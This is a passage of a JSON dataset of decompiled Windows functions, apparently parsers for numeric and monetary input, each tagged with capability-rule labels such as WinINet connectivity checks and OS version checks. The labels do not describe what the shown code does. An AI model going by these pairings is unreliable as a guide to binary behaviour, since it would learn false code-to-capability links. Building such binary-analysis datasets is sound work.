0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x79) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    *(unaff_EBP + -0x7a) = 0;\n    cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        if (*(iVar8 + 6) != *(unaff_EBP + -0x48)) goto code_r0x0042d243;\n        *(unaff_EBP + -0x79) = 1;\n        *(unaff_EBP + -0x8c) = 1;\n        fcn.0042eb11();\n        cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar3 != '\\0') {\ncode_r0x0042d23c:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x0042d243;\n            }\n            goto code_r0x0042d247;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 != *(unaff_EBP + -0x16)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00430056();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x18)) goto code_r0x0042d23c;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x0042d23c;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        fcn.0042eb11();\ncode_r0x0042d24b:\n        *(unaff_EBP + -0x80) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x0042d243:\n        if (uVar11 != 0) {\ncode_r0x0042d247:\n            if (uVar11 != 10) goto code_r0x0042d24b;\n        }\n    }\n    *(unaff_EBP + -0x50) = 0;\n    *(unaff_EBP + -0x4c) = 0xf;\n    *(unaff_EBP + -0x60) = 0;\n    fcn.0040acd0(1, *(unaff_EBP + -0x8c));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x94) + 0x1f;\n    cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar12 = fcn.0042758d(unaff_EBP + -0x48, *(iVar8 + 6));\n            if (uVar12 < *(unaff_EBP + -0x80)) {\n                cVar1 = *(unaff_EBP + -0x7a);\n                cVar3 = \"0123456789ABCDEFabcdef-+Xx\"[uVar12];\n                pcVar9 = *(unaff_EBP + -0x84);\n                *pcVar9 = cVar3;\n                if (((cVar1 != '\\0') || (cVar3 != '0')) && (pcVar9 < *(unaff_EBP + -0x8c))) {\n                    *(unaff_EBP + -0x7a) = 1;\n                    *(unaff_EBP + -0x84) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x60;\n                *(unaff_EBP + -0x79) = 1;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x60;\n                    if (0xf < *(unaff_EBP + -0x4c)) {\n                        iVar6 = *(unaff_EBP + -0x60);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                iVar6 = *(unaff_EBP + -0x60);\n                iVar7 = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x0042d386;\n                iVar4 = *(iVar8 + 6);\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar4 = *(iVar8 + 6);\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (iVar4 != *(unaff_EBP + -0x90)) goto code_r0x0042d386;\n                fcn.00406de0(1, 0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.0042eb11();\n            cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n        } while (cVar3 == '\\0');\n        iVar6 = *(unaff_EBP + -0x60);\ncode_r0x0042d386:\n        uVar12 = *(unaff_EBP + -0x4c);\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x60;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar3 = '\\0';\n                goto code_r0x0042d3ad;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        iVar6 = *(unaff_EBP + -0x60);\n        uVar12 = *(unaff_EBP + -0x4c);\n    }\n    cVar3 = *(unaff_EBP + -0x79);\ncode_r0x0042d3ad:\n    pcVar9 = unaff_EBP + -0x78;\n    if (0xf < *(unaff_EBP + -100)) {\n        pcVar9 = *(unaff_EBP + -0x78);\n    }\n    if (cVar3 == '\\0') {\ncode_r0x0042d427:\n        puVar10 = *(unaff_EBP + -0x94);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar3 = *pcVar9,  cVar3 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x60);\n                }\n                iVar6 = *(unaff_EBP + -0x60);\n                if (cVar3 != *(*(unaff_EBP + -0x80) + iVar13)) goto code_r0x0042d427;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    *(unaff_EBP + -0x80) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x4c);\n                if (cVar3 < **(unaff_EBP + -0x80)) goto code_r0x0042d427;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x84);\n        if (*(unaff_EBP + -0x7a) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.00406810();\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 3084
    },
    "0042d448": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042d448(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_40h;\n    uint *var_3ch;\n    int32_t var_38h;\n    uint *var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    char var_25h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    puVar5 = &var_24h;\n    var_30h = arg_10h;\n    var_2ch = arg_20h;\n    var_34h = puVar5;\n    cVar2 = fcn.00435185(arg_10h);\n    if (cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00430056();\n        }\n        pcVar1 = *(*arg_20h + 0x38);\n        (**0x4742a4)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        if ((cVar2 == '+') || (arg_20h = var_2ch,  cVar2 == '-')) {\n            puVar5 = &var_24h + 1;\n            var_34h = puVar5;\n            var_24h._0_1_ = cVar2;\n            fcn.0042eb11();\n            arg_20h = var_2ch;\n        }\n    }\n    var_25h = '\\0';\n    cVar3 = fcn.00435185(var_30h);\n    cVar2 = var_25h;\n    if (cVar3 == '\\0') {\n        do {\n            if (*(arg_ch + 4) == '\\0') {\n                fcn.00430056();\n            }\n            pcVar1 = *(*arg_20h + 0x38);\n            (**0x4742a4)(*(arg_ch + 6), 0);\n            cVar3 = (*pcVar1)();\n            if (cVar3 != '0') break;\n            cVar2 = '\\x01';\n            fcn.0042eb11();\n            cVar3 = fcn.00435185(var_30h);\n            arg_20h = var_2ch;\n        } while (cVar3 == '\\0');\n        puVar5 = var_34h;\n        var_25h = cVar2;\n        if (cVar2 != '\\0') {\n            *var_34h = '0';\n            puVar5 = var_34h + 1;\n        }\n    }\n    while (cVar2 = fcn.00435185(var_30h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00430056();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x4742a4)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        if (9 < cVar2 - 0x30U) break;\n        *puVar5 = cVar2;\n        if (puVar5 < &var_5h) {\n            puVar5 = puVar5 + 1;\n        }\n        var_25h = '\\x01';\n        fcn.0042eb11();\n    }\n    if (var_25h == '\\0') {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_38h = 0;\n    iVar4 = fcn.00438a09(&var_24h, &var_3ch, 10, &var_38h);\n    fcn.00435185(var_30h);\n    if ((((var_3ch != &var_24h) && (var_38h == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.0043a2e7(arg_10h);\n    return;\n}\n",
        "token_count": 1018
    },
    "0042d5fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042d5fa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    bool bVar4;\n    char cVar5;\n    int16_t iVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    char *pcVar16;\n    uint32_t uVar17;\n    int32_t unaff_EBP;\n    int16_t *piVar18;\n    int32_t iVar19;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xa0);\n    *(unaff_EBP + -0x70) = 0;\n    iVar1 = *(unaff_EBP + 0xc);\n    uVar9 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x1c);\n    fcn.00421bb3(uVar9);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar7 = fcn.004289db(unaff_EBP + -0x8c);\n        *(unaff_EBP + -100) = piVar7;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar7 = fcn.00428935(unaff_EBP + -0x8c);\n        *(unaff_EBP + -100) = piVar7;\n    }\n    fcn.00401990();\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x65) = 0;\n    *(unaff_EBP + -0x59) = 0;\n    *(unaff_EBP + -0x44) = 7;\n    *(unaff_EBP + -0x58) = 0;\n    iVar19 = *piVar7;\n    *(unaff_EBP + -4) = 3;\n    pcVar2 = *(iVar19 + 0x2c);\n    (**0x4742a4)(unaff_EBP + -0x9c);\n    (*pcVar2)();\n    puVar3 = *(unaff_EBP + -0x78);\n    *(puVar3 + 0x10) = 0;\n    *(puVar3 + 0x14) = 0xf;\n    *puVar3 = 0;\n    uVar17 = 1;\n    *(unaff_EBP + -0x60) = 1;\n    uVar9 = *(*(unaff_EBP + -0x98) + 0x30);\n    *(unaff_EBP + -0x70) = 1;\n    fcn.00421bb3(uVar9);\n    *(unaff_EBP + -4) = 4;\n    piVar7 = fcn.00428405(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x94) = piVar7;\n    fcn.00401990();\n    pcVar2 = *(*piVar7 + 0x2c);\n    (**0x4742a4)(0x4759d8, 0x4759e4, *(unaff_EBP + -0x90));\n    (*pcVar2)();\n    uVar8 = 0;\n    *(unaff_EBP + -0x80) = 0;\n    do {\n        if (3 < uVar8) break;\n        cVar5 = *(unaff_EBP + -0x9c + uVar8);\n        if (cVar5 == ' ') {\ncode_r0x0042df4a:\n            if (*(unaff_EBP + -0x80) == 3) goto code_r0x0042d77a;\n            *(unaff_EBP + -0x71) = 0;\n            cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n            if (cVar5 == '\\0') {\n                uVar9 = *(unaff_EBP + -0x6c);\n                do {\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    pcVar2 = *(**(unaff_EBP + -0x94) + 0x10);\n                    (**0x4742a4)(0x48, *(iVar1 + 6));\n                    cVar5 = (*pcVar2)();\n                    if (cVar5 == '\\0') break;\n                    *(unaff_EBP + -0x71) = 1;\n                    fcn.0042eb11();\n                    cVar5 = fcn.00435185(uVar9);\n                } while (cVar5 == '\\0');\n                uVar17 = *(unaff_EBP + -0x60);\n            }\n            if ((*(unaff_EBP + -0x9c + *(unaff_EBP + -0x80)) != ' ') || (*(unaff_EBP + -0x71) != '\\0'))\n            goto code_r0x0042d77a;\n            cVar5 = '\\x01';\n            *(unaff_EBP + -0x59) = 1;\n        }\n        else {\n            if (cVar5 == '$') {\n                pcVar2 = *(**(unaff_EBP + -100) + 0x18);\n                (**0x4742a4)(unaff_EBP + -0x28);\n                (*pcVar2)();\n                uVar17 = uVar17 | 0x20;\n                *(unaff_EBP + -0x60) = uVar17;\n                *(unaff_EBP + -0x70) = uVar17;\n                uVar9 = *(unaff_EBP + -0x6c);\n                *(unaff_EBP + -4) = 5;\n                if (((*(*(unaff_EBP + -0x98) + 0x14) & 8) == 0) && (cVar5 = fcn.00435185(uVar9),  cVar5 == '\\0')) {\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    piVar14 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        piVar14 = *(unaff_EBP + -0x28);\n                    }\n                    if (*(iVar1 + 6) == *piVar14) goto code_r0x0042de7f;\ncode_r0x0042deb8:\n                    fcn.004351e7(0);\n                }\n                else {\ncode_r0x0042de7f:\n                    if ((*(unaff_EBP + -0x80) == 3) && (*(unaff_EBP + -0x48) < 2)) {\n                        cVar5 = fcn.00435185(uVar9);\n                        if (cVar5 == '\\0') {\n                            if (*(iVar1 + 4) == '\\0') {\n                                fcn.00430056();\n                            }\n                            piVar14 = unaff_EBP + -0x28;\n                            if (7 < *(unaff_EBP + -0x14)) {\n                                piVar14 = *(unaff_EBP + -0x28);\n                            }\n                            if (*(iVar1 + 6) == *piVar14) goto code_r0x0042dec2;\n                        }\n                        goto code_r0x0042deb8;\n                    }\n                }\ncode_r0x0042dec2:\n                piVar14 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    piVar14 = *(unaff_EBP + -0x28);\n                }\n                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                if (cVar5 == '\\0') {\n                    uVar9 = *(unaff_EBP + -0x6c);\n                    do {\n                        iVar19 = unaff_EBP + -0x28;\n                        if (7 < *(unaff_EBP + -0x14)) {\n                            iVar19 = *(unaff_EBP + -0x28);\n                        }\n                        if (piVar14 == iVar19 + *(unaff_EBP + -0x18) * 2) break;\n                        if (*(iVar1 + 4) == '\\0') {\n                            fcn.00430056();\n                        }\n                        if (*(iVar1 + 6) != *piVar14) break;\n                        piVar14 = piVar14 + 1;\n                        fcn.0042eb11();\n                        cVar5 = fcn.00435185(uVar9);\n                    } while (cVar5 == '\\0');\n                    uVar17 = *(unaff_EBP + -0x60);\n                }\n                iVar19 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar19 = *(unaff_EBP + -0x28);\n                }\n                if (piVar14 != iVar19 + *(unaff_EBP + -0x18) * 2) {\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                *(unaff_EBP + -4) = 3;\n            }\n            else {\n                if (cVar5 != '+') {\n                    if (cVar5 != 'v') {\n                        if (cVar5 == 'x') goto code_r0x0042df4a;\n                        goto code_r0x0042d77a;\n                    }\n                    *(unaff_EBP + -0x7c) = 0;\n                    pcVar2 = *(**(unaff_EBP + -100) + 0x24);\n                    (**0x4742a4)();\n                    uVar9 = (*pcVar2)();\n                    *(unaff_EBP + -0x84) = uVar9;\n                    pcVar2 = *(**(unaff_EBP + -100) + 0x14);\n                    (**0x4742a4)(unaff_EBP + -0x40);\n                    (*pcVar2)();\n                    uVar17 = uVar17 | 0x4000;\n                    *(unaff_EBP + -0x60) = uVar17;\n                    *(unaff_EBP + -0x70) = uVar17;\n                    *(unaff_EBP + -4) = 10;\n                    if (*(unaff_EBP + -0x30) == 0) {\ncode_r0x0042da1c:\n                        uVar9 = *(unaff_EBP + -0x6c);\n                        cVar5 = fcn.00435185(uVar9);\n                        if (cVar5 == '\\0') {\n                            do {\n                                if (*(iVar1 + 4) == '\\0') {\n                                    fcn.00430056();\n                                }\n                                uVar8 = fcn.0042758d(*(unaff_EBP + -0x90), *(iVar1 + 6));\n                                if (9 < uVar8) break;\n                                *(unaff_EBP + -0xa8) = *(uVar8 + 0x4759d8);\n                                fcn.0040c5c0(*(unaff_EBP + -0xa8));\n                                fcn.0042eb11();\n                                cVar5 = fcn.00435185(uVar9);\n                            } while (cVar5 == '\\0');\n                            uVar17 = *(unaff_EBP + -0x60);\n                        }\ncode_r0x0042da81:\n                        pcVar2 = *(**(unaff_EBP + -100) + 0xc);\n                        (**0x4742a4)();\n                        iVar6 = (*pcVar2)();\n                        cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                        if ((cVar5 == '\\0') && (iVar6 != 0)) {\n                            if (*(iVar1 + 4) == '\\0') {\n                                fcn.00430056();\n                            }\n                            if (*(iVar1 + 6) != iVar6) goto code_r0x0042db50;\n                            fcn.0042eb11();\n                            cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                            iVar19 = *(unaff_EBP + -0x84);\n                            while (cVar5 == '\\0') {\n                                iVar12 = *(unaff_EBP + -0x7c);\n                                if (iVar19 <= iVar12) goto code_r0x0042db59;\n                                if (*(iVar1 + 4) == '\\0') {\n                                    fcn.00430056();\n                                }\n                                uVar8 = fcn.0042758d(*(unaff_EBP + -0x90), *(iVar1 + 6));\n                                if (9 < uVar8) break;\n                                *(unaff_EBP + -0x88) = *(uVar8 + 0x4759d8);\n                                fcn.0040c5c0(*(unaff_EBP + -0x88));\n                                *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x7c) + 1;\n                                fcn.0042eb11();\n                                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                            }\n                            iVar12 = *(unaff_EBP + -0x7c);\n                            if (iVar12 < iVar19) {\n                                *(unaff_EBP + -0x59) = 1;\n                            }\n                        }\n                        else {\ncode_r0x0042db50:\n                            iVar19 = *(unaff_EBP + -0x84);\n                            iVar12 = *(unaff_EBP + -0x7c);\n                        }\ncode_r0x0042db59:\n                        if (*(*(unaff_EBP + -0x78) + 0x10) == 0) {\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                        else if (iVar12 < iVar19) {\n                            iVar19 = iVar19 - iVar12;\n                            do {\n                                fcn.0040c5c0(0x30);\n                                iVar19 = iVar19 + -1;\n                            } while (iVar19 != 0);\n                            uVar17 = *(unaff_EBP + -0x60);\n                        }\n                    }\n                    else {\n                        pcVar2 = *(**(unaff_EBP + -100) + 0x10);\n                        (**0x4742a4)();\n                        uVar8 = (*pcVar2)();\n                        *(unaff_EBP + -0xa4) = uVar8 & 0xffff;\n                        if ((uVar8 & 0xffff) == 0) goto code_r0x0042da1c;\n                        puVar10 = unaff_EBP + -0x40;\n                        if (0xf < *(unaff_EBP + -0x2c)) {\n                            puVar10 = *(unaff_EBP + -0x40);\n                        }\n                        if (0x7e < *puVar10) goto code_r0x0042da1c;\n                        *(unaff_EBP + -0x14) = 0xf;\n                        *(unaff_EBP + -0x18) = 0;\n                        *(unaff_EBP + -0x28) = 0;\n                        fcn.0040acd0(1, 0);\n                        *(unaff_EBP + -4) = 0xb;\n                        iVar19 = 0;\n                        cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                        if (cVar5 == '\\0') {\n                            do {\n                                if (*(iVar1 + 4) == '\\0') {\n                                    fcn.00430056();\n                                }\n                                uVar8 = fcn.0042758d(*(unaff_EBP + -0x90), *(iVar1 + 6));\n                                if (uVar8 < 10) {\n                                    *(unaff_EBP + -0xa0) = *(uVar8 + 0x4759d8);\n                                    fcn.0040c5c0(*(unaff_EBP + -0xa0));\n                                    iVar12 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar12 = *(unaff_EBP + -0x28);\n                                    }\n                                    if (*(iVar12 + iVar19) != '\\x7f') {\n                                        iVar12 = unaff_EBP + -0x28;\n                                        if (0xf < *(unaff_EBP + -0x14)) {\n                                            iVar12 = *(unaff_EBP + -0x28);\n                                        }\n                                        *(iVar12 + iVar19) = *(iVar12 + iVar19) + '\\x01';\n                                    }\n                                }\n                                else {\n                                    iVar12 = *(unaff_EBP + -0x28);\n                                    iVar11 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar11 = iVar12;\n                                    }\n                                    if (*(iVar11 + iVar19) == '\\0') goto code_r0x0042d982;\n                                    iVar6 = *(iVar1 + 6);\n                                    if (*(iVar1 + 4) == '\\0') {\n                                        fcn.00430056();\n                                        iVar6 = *(iVar1 + 6);\n                                        iVar12 = *(unaff_EBP + -0x28);\n                                    }\n                                    if (iVar6 != *(unaff_EBP + -0xa4)) goto code_r0x0042d982;\n                                    fcn.00406de0(1, 0);\n                                    iVar19 = iVar19 + 1;\n                                }\n                                fcn.0042eb11();\n                                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                            } while (cVar5 == '\\0');\n                            iVar12 = *(unaff_EBP + -0x28);\ncode_r0x0042d982:\n                            if (iVar19 == 0) goto code_r0x0042d998;\n                            iVar11 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                iVar11 = iVar12;\n                            }\n                            if ('\\0' < *(iVar11 + iVar19)) {\n                                iVar19 = iVar19 + 1;\n                                goto code_r0x0042d998;\n                            }\n                            cVar5 = '\\x01';\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                        else {\ncode_r0x0042d998:\n                            cVar5 = *(unaff_EBP + -0x59);\n                        }\n                        pcVar16 = unaff_EBP + -0x40;\n                        if (0xf < *(unaff_EBP + -0x2c)) {\n                            pcVar16 = *(unaff_EBP + -0x40);\n                        }\n                        if (cVar5 == '\\0') {\n                            while( true ) {\n                                if ((iVar19 == 0) || (cVar5 = *pcVar16,  cVar5 == '\\x7f')) goto code_r0x0042d9f7;\n                                iVar19 = iVar19 + -1;\n                                if (iVar19 != 0) break;\ncode_r0x0042d9cc:\n                                if (iVar19 == 0) {\n                                    pcVar13 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        pcVar13 = *(unaff_EBP + -0x28);\n                                    }\n                                    if (cVar5 < *pcVar13) goto code_r0x0042d9f3;\n                                }\n                                if ('\\0' < pcVar16[1]) {\n                                    pcVar16 = pcVar16 + 1;\n                                }\n                            }\n                            iVar12 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                iVar12 = *(unaff_EBP + -0x28);\n                            }\n                            if (cVar5 == *(iVar12 + iVar19)) goto code_r0x0042d9cc;\ncode_r0x0042d9f3:\n                            *(unaff_EBP + -0x59) = 1;\n                        }\ncode_r0x0042d9f7:\n                        fcn.00406810();\n                        if (*(unaff_EBP + -0x59) == '\\0') {\n                            *(unaff_EBP + -4) = 10;\n                            goto code_r0x0042da81;\n                        }\n                    }\n                    *(unaff_EBP + -4) = 3;\n                    fcn.00406810();\n                    goto code_r0x0042d77a;\n                }\n                cVar5 = fcn.00435185(*(unaff_EBP + -0x6c));\n                if (cVar5 != '\\0') goto code_r0x0042d77a;\n                pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                (**0x4742a4)(unaff_EBP + -0x28);\n                (*pcVar2)();\n                *(unaff_EBP + -4) = 6;\n                *(unaff_EBP + -0x60) = uVar17 | 0x42;\n                *(unaff_EBP + -0x70) = uVar17 | 0x42;\n                if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0042dc1e:\n                    bVar4 = false;\n                }\n                else {\n                    pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                    (**0x4742a4)(unaff_EBP + -0x40);\n                    (*pcVar2)();\n                    *(unaff_EBP + -4) = 7;\n                    piVar14 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -0x60) = uVar17 | 0xc6;\n                    *(unaff_EBP + -0x70) = uVar17 | 0xc6;\n                    if (7 < *(unaff_EBP + -0x2c)) {\n                        piVar14 = *(unaff_EBP + -0x40);\n                    }\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    if (*piVar14 != *(iVar1 + 6)) goto code_r0x0042dc1e;\n                    bVar4 = true;\n                }\n                uVar8 = *(unaff_EBP + -0x60);\n                if ((uVar8 & 4) != 0) {\n                    *(unaff_EBP + -0x60) = uVar8 & 0xfffffffb;\n                    fcn.00430cd4();\n                    uVar8 = *(unaff_EBP + -0x60);\n                }\n                *(unaff_EBP + -4) = 3;\n                *(unaff_EBP + -0x60) = uVar8 & 0xfffffffd;\n                *(unaff_EBP + -0x70) = uVar8 & 0xfffffffd;\n                fcn.00430cd4();\n                if (!bVar4) {\n                    piVar7 = *(unaff_EBP + -100);\n                    pcVar2 = *(*piVar7 + 0x20);\n                    (**0x4742a4)(unaff_EBP + -0x28);\n                    (*pcVar2)();\n                    uVar8 = *(unaff_EBP + -0x60) | 0x208;\n                    *(unaff_EBP + -4) = 8;\n                    *(unaff_EBP + -0x60) = uVar8;\n                    *(unaff_EBP + -0x70) = uVar8;\n                    if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0042dd20:\n                        bVar4 = false;\n                    }\n                    else {\n                        pcVar2 = *(*piVar7 + 0x20);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar2)();\n                        piVar14 = unaff_EBP + -0x40;\n                        uVar8 = *(unaff_EBP + -0x60) | 0x410;\n                        *(unaff_EBP + -4) = 9;\n                        *(unaff_EBP + -0x60) = uVar8;\n                        *(unaff_EBP + -0x70) = uVar8;\n                        if (7 < *(unaff_EBP + -0x2c)) {\n                            piVar14 = *(unaff_EBP + -0x40);\n                        }\n                        if (*(iVar1 + 4) == '\\0') {\n                            fcn.00430056();\n                            uVar8 = *(unaff_EBP + -0x60);\n                        }\n                        if (*piVar14 != *(iVar1 + 6)) goto code_r0x0042dd20;\n                        bVar4 = true;\n                    }\n                    if ((uVar8 & 0x10) != 0) {\n                        *(unaff_EBP + -0x60) = uVar8 & 0xffffffef;\n                        fcn.00430cd4();\n                        uVar8 = *(unaff_EBP + -0x60);\n                    }\n                    *(unaff_EBP + -4) = 3;\n                    *(unaff_EBP + -0x60) = uVar8 & 0xfffffff7;\n                    *(unaff_EBP + -0x70) = uVar8 & 0xfffffff7;\n                    fcn.00430cd4();\n                    if (bVar4) {\n                        fcn.0042eb11();\n                        pcVar2 = *(**(unaff_EBP + -100) + 0x20);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar2)();\n                        uVar17 = *(unaff_EBP + -0x60) | 0x800;\n                        *(unaff_EBP + -0x60) = uVar17;\n                        *(unaff_EBP + -0x70) = uVar17;\n                        fcn.004294b3(unaff_EBP + -0x40);\n                        fcn.00430cd4();\n                        *(unaff_EBP + -0x65) = 1;\n                    }\n                    else {\n                        pcVar2 = *(**(unaff_EBP + -100) + 0x1c);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar2)();\n                        uVar8 = *(unaff_EBP + -0x60);\n                        iVar19 = *(unaff_EBP + -0x30);\n                        uVar17 = uVar8 | 0x1000;\n                        *(unaff_EBP + -0x60) = uVar17;\n                        *(unaff_EBP + -0x70) = uVar17;\n                        fcn.00430cd4();\n                        if (iVar19 != 0) {\n                            pcVar2 = *(**(unaff_EBP + -100) + 0x20);\n                            